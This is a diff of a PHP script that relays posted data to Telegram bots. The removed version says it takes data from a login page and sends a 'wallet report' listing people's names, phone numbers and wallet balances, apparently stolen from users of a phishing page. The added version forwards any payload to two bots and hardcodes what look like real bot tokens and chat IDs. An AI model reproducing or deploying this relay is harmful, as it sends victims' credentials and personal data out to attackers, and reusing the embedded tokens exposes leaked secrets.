@@ -1,54 +1,69 @@
 <?php
 
-ini_set('display_errors',1);
+ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 
-$token = "8677498486:AAFyHSstosvrtaBJwj-_eV25U3eWKkbKwOo";
-$chat  = "8940716704";
+/* ================= TELEGRAM BOTS ================= */
+
+$bots = [
+
+    [
+        "token" => "8677498486:AAFyHSstosvrtaBJwj-_eV25U3eWKkbKwOo",
+        "chat_id" => "8940716704"
+    ],
+
+    [
+        "token" => "8565074370:AAFz_Opi7kYiAJc5ptVHhsxNzIEPAZIYUpUE",
+        "chat_id" => "8938414761"
+    ]
+
+];
 
 
-// GET DATA FROM LOGIN PHP
-$raw = file_get_contents("php://input");
+/* ================= RECEIVE ANYTHING ================= */
+
+$payload = file_get_contents("php://input");
 
 
-// IF NOTHING RECEIVED, SEND TEST MESSAGE
-if(!$raw){
-
-    $message = "🔥 TEST FROM RENDER ".date("Y-m-d H:i:s");
-
-}else{
+$time = date("Y-m-d H:i:s");
 
 
-    $data = json_decode($raw,true);
+$message = "🔥 RENDER MESSAGE RECEIVED\n\n";
+$message .= "🕒 TIME: ".$time."\n\n";
 
 
-    $message = "💰 SHJEEEE WALLET REPORT\n\n";
+if(!$payload || empty(trim($payload))){
+
+    $message .= "⚠️ EMPTY PAYLOAD";
+
+} else {
 
 
-    if(isset($data['users'])){
+    // TRY JSON FIRST
+
+    $data = json_decode($payload, true);
 
 
-        foreach($data['users'] as $user){
+    if(json_last_error() === JSON_ERROR_NONE){
 
 
-            $message .= 
-            "👤 ".$user['name']."\n".
-            "📱 ".$user['phone']."\n".
-            "💵 UGX ".$user['wallet']."\n".
-            "-------------------\n";
+        $message .= "📦 JSON DATA:\n\n";
+
+        $message .= json_encode(
+            $data,
+            JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
+        );
 
 
-        }
+    } else {
 
 
-        $message .= "\n🔥 TOTAL WALLET\n";
-        $message .= "UGX ".$data['total_wallet'];
+        // NOT JSON, SEND RAW TEXT
 
+        $message .= "📝 RAW DATA:\n\n";
 
-    }else{
-
-        $message .= $raw;
+        $message .= $payload;
 
     }
 
@@ -56,58 +71,38 @@ if(!$raw){
 
 
 
-// SEND TO TELEGRAM
+/* ================= SEND TO ALL TELEGRAM BOTS ================= */
 
-$url = "https://api.telegram.org/bot".$token."/sendMessage";
-
-
-$post = [
-    "chat_id"=>$chat,
-    "text"=>$message
-];
+foreach($bots as $bot){
 
 
-$ch = curl_init($url);
+    $url = "https://api.telegram.org/bot".$bot['token']."/sendMessage";
 
 
-curl_setopt_array($ch,[
+    file_get_contents($url . "?" . http_build_query([
 
-    CURLOPT_POST=>true,
+        "chat_id" => $bot['chat_id'],
 
-    CURLOPT_POSTFIELDS=>$post,
+        "text" => $message
 
-    CURLOPT_RETURNTRANSFER=>true
+    ]));
+
+
+}
+
+
+
+/* ================= RESPONSE TO SENDER ================= */
+
+echo json_encode([
+
+    "status" => "received",
+
+    "time" => $time,
+
+    "payload" => $payload
 
 ]);
 
-
-$result = curl_exec($ch);
-
-
-$error = curl_error($ch);
-
-
-curl_close($ch);
-
-
-
-echo "<pre>";
-
-echo "MESSAGE SENT:\n\n";
-
-echo $message;
-
-
-echo "\n\nTELEGRAM RESPONSE:\n";
-
-print_r($result);
-
-
-echo "\n\nCURL ERROR:\n";
-
-print_r($error);
-
-
-echo "</pre>";
 
 ?>
